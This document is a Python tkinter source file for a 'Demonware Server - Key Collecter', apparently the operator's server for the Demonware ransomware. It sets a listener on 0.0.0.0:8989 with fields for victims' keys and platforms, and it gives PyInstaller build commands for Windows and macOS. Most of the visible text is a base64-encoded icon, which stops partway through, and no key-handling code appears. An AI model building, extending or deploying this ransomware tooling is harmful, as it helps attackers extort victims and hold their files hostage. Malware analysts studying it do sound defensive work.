#!/usr/bin/env python3
'''
To compile this to EXE, do:
pyinstaller.exe -F -w -i icon.ico --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import ttkthemes ui_server.py

For MacOS:
pyinstaller -F -w -i icon.ico --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import ttkthemes ui_server.py
'''
import os, sys, subprocess, threading, time, datetime, socket, select, base64, PIL.Image, PIL.ImageTk
#from PIL import ImageTk, Image
from io import BytesIO
from tkinter import *
from tkinter.ttk import *
from ttkthemes import ThemedStyle

class MainWindow(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = "Demonware Server - Key Collecter") # Set window title
        self.resizable(0,0) # Do not allow to be resized
        self.ttkStyle = ThemedStyle()
        self.ttkStyle.set_theme("arc")
        self.configure(background = 'white')
        #icon = PhotoImage(file='icon.png') # Set app icon
        #self.tk.call('wm', 'iconphoto', self._w, icon) # Call app icon

        # Input field data is being inserted in this dict
        self.options = {
            'host' : StringVar(),
            'port' : IntVar(),
            'remote' : StringVar(),
            'local' : StringVar(),
            'platform' : StringVar(),
            'key' : StringVar(),
        }

        self.bind("<Escape>", self.exit) # Press ESC to quit app

        self.options['host'].set('0.0.0.0')
        self.options['port'].set(8989)

        photo_code = '''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
